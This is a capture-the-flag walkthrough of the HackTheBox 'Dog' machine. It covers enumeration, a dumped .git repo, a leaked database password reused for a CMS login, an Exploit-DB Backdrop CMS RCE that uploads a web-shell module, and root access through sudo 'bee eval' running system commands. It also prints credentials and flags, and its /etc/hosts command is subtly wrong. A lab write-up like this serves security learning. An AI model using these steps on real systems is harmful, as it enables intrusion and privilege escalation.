machine : [Dog HackTheBox](https://app.hackthebox.com/machines/Dog)

# Enumeration : 
First starting by scanning wih nmap 

```
# Nmap 7.95 scan initiated Sat Apr  5 12:13:03 2025 as: /usr/lib/nmap/nmap --privileged -sV -oN namp.txt 10.10.11.58
Nmap scan report for 10.10.11.58 (10.10.11.58)
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  5 12:20:20 2025 -- 1 IP address (1 host up) scanned in 437.00 seconds
```

and adding the domain to the `etc/hosts` 

```bash
$sudo echo "10.10.11.58      dog.htb" > /etc/hosts
```

we have something on the web  

<img src="assets/Pasted image 20250406065318.png">

Dogs website . cool ! 
running a `whatweb` check 
```bash
┌──(kali㉿kali)-[~/…/CTF/HTB/machines/dog]
└─$ whatweb  dog.htb       
http://dog.htb [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.58], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]
```

the site running under backdrop CMS  , keepingthat in mind 
investigating more with dirsearch 

```
┌──(kali㉿kali)-[~/…/CTF/HTB/machines/dog]
└─$ dirsearch -u http://dog.htb/  -w /usr/share/seclists/Discovery/Web-Content/big.txt     
  
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 20478

Output File: /home/kali/repo/obsidian-vault/CTF/HTB/machines/dog/reports/http_dog.htb/__25-04-06_05-10-45.txt

Target: http://dog.htb/

[05:10:45] Starting: 
[05:10:47] 301 -  301B  - /.git  ->  http://dog.htb/.git/                   
[05:11:07] 301 -  301B  - /core  ->  http://dog.htb/core/                   
[05:11:16] 301 -  302B  - /files  ->  http://dog.htb/files/                 
[05:11:38] 301 -  304B  - /layouts  ->  http://dog.htb/layouts/             
[05:11:49] 301 -  304B  - /modules  ->  http://dog.htb/modules/             
[05:12:21] 200 -  528B  - /robots.txt                                       
[05:12:25] 403 -  272B  - /server-status                                    
[05:12:27] 301 -  302B  - /sites  ->  http://dog.htb/sites/                 
[05:12:35] 301 -  303B  - /themes  ->  http://dog.htb/themes/               
Task Completed
```

looking if theres some hidden subdmains 

```
gobuster dns -d dog.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     dog.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 37126 / 100001 (37.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 37140 / 100001 (37.14%)
===============================================================
Finished
===============================================================
```

it doesnt appear to have any subdomain ... trying to look up on the site 
we have something in  `/core` `/files` `/.git` `/robots.txt` 

the `/.git`  and `/core`  appear to have something  
`/core` : File directory 

<img src="assets/Pasted image 20250406070648.png">
Appear to be the source code of [backdrop CMS](https://github.com/backdrop/backdrop)

# Exploitaiton 
the `/.git` appears to be a git repo .. reconstructing it with [githacks](https://github.com/lijiejie/GitHack) 

<img src="assets/Pasted image 20250406073554.png">

already done everything .. after investingating the `/core`  folder i found out this under the `update.php` 

---
further investigation leads some creds for the login page , theres a password in the `./settings.php` file 
```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';

```
some connection to the localhost , and something else in the 

```
$cat /files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json 
{
    "_config_name": "update.settings",
    "_config_static": true,
    "update_cron": 1,
    "update_disabled_extensions": 0,
    "update_interval_days": 0,
    "update_url": "",
    "update_not_implemented_url": "https://github.com/backdrop-ops/backdropcms.org/issues/22",
    "update_max_attempts": 2,
    "update_timeout": 30,
    "update_emails": [
        "tiffany@dog.htb"
    ],
    "update_threshold": "all",
    "update_requirement_type": 0,
    "update_status": [],
    "update_projects": []
}
```

some users called tiffany 

if we try these creds `tiffany:BackDropJ2024DS2024`   on the backdrops CMS we authenticate 
<img src="assets/Pasted image 20250407045856.png">


searching for some exploit find this one https://www.exploit-db.com/exploits/52021 

```bash 
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 52021.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
```

for our case , the CMS doesnt accept normal file under  `http://dog.htb/?q=admin/installer/manual` when we do manual install so we have to convert `shell` folder into a `.tar.gz` file and upload it 

<img src="assets/Pasted image 20250407100527.png">
succefully installed now we can go to the `http://dog.htb/modules/shell/shell.php
` like it said in the instruction 

for more enumeration we found other users like this 
<img src="assets/Pasted image 20250407100807.png">

trying to ssh with the password we found intially 
<img src="assets/Pasted image 20250407100958.png">
boom we have a shell now 
retrieving the user flag 

user.txt :  09879539d5be3b772db3f3922d16083f 
# PrivEscalation
trying to get the root flag now .. 

we can use some of the linpease script but i prefer not to cuz its too verbose , so looking manually would be easier then looking thru a tons of logs 

```bash
johncusack@dog:~$ sudo -l 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

```

we can run sudo for a binarry called `bee` 
its a command utility that allows user to intercat with the CMS 

further investigation we have some ports that are running locally 
```bash 
johncusack@dog:~$ ss -tulpn 
udp      UNCONN    0         0          127.0.0.53%lo:53        0.0.0.0:*  
tcp      LISTEN    0         70             127.0.0.1:33060     0.0.0.0:*        
tcp      LISTEN    0         151            127.0.0.1:3306      0.0.0.0:*
tcp      LISTEN    0         4096       127.0.0.53%lo:53        0.0.0.0:*
tcp      LISTEN    0         128              0.0.0.0:22        0.0.0.0:*
tcp      LISTEN    0         511                    *:80              *:*
tcp      LISTEN    0         128                 [::]:22           [::]:*   
```

port `3306` and `33060`  are running locally , soo it might have something there 
we cannot get the process id so we dont know who is running that port but lets assume its root for now 

well it appear nothing is ther .. we investiage more with the [bee](https://github.com/backdrop-contrib/bee)  command , 
we can execute a php script under root  with the eval option since we know the `eval` comamnd almost do the same thing .. that is a good way to end up everything 

```bash
  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

```bash 
johncusack@dog:~$ sudo /usr/local/bin/bee ev "system('cat /root/root.txt')" 
 ✘  The required bootstrap level for 'eval' is not ready. 
```

 wat is this level ?? 
 since we know the bee command is just linked file to a php script 
 `cat /backdrop_tool/bee/bee.php`

when reading the script we found out that this level is just the hosting directory under `/var/www/html` 

```bash
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee ev "system('cat /root/root.txt')" 
fbbec2f89e831c6d29db5e496e2dead4
```

root.txt :  fbbec2f89e831c6d29db5e496e2dead4 
[[machines]]